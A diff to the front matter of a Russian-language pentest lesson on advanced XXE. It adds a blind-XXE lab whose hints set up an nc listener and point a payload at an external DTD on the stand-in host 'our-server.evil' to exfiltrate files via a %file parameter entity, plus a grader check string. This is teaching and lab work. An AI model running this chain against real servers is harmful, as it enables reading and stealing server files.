@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 42
 summary: "Продвинутый XXE: слепая OOB-эксфильтрация, parameter entities, error-based, XInclude, XXE→SSRF и обход фильтров."
+lab:
+  kind: shell
+  title: 'Практика: blind XXE — OOB-эксфильтрация'
+  toolset: [core, curl, nc]
+  workdir: /home/student/task
+  files: [task.md, payload.xml]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Сначала убедись, что in-band XXE молчит: сервер отвечает `{"status":"ok"}`.'
+    - 'Подними слушатель на своём сервере: `nc -lvnp 80 > found.txt`.'
+    - 'Изучи `payload.xml`: внешний DTD `http://our-server.evil/evil.dtd` и параметрическая сущность `%file`.'
+    - 'Отправь `--data-binary @payload.xml` — внешний DTD вынесет файл в запросе к нам, его поймает `nc`; набери `check`.'
 ---
 
 В прошлом уроке нам повезло: сервер вернул содержимое `/etc/passwd` прямо в сообщении об ошибке. Но так бывает редко. Чаще приложение «проглатывает» XML, создаёт счёт и отвечает просто `{"status":"ok"}`. Данные мы прочитали — а увидеть их не можем. Значит, нужно вынести их наружу так, чтобы сервер сам отправил их нам. Этому и посвящён продвинутый XXE.
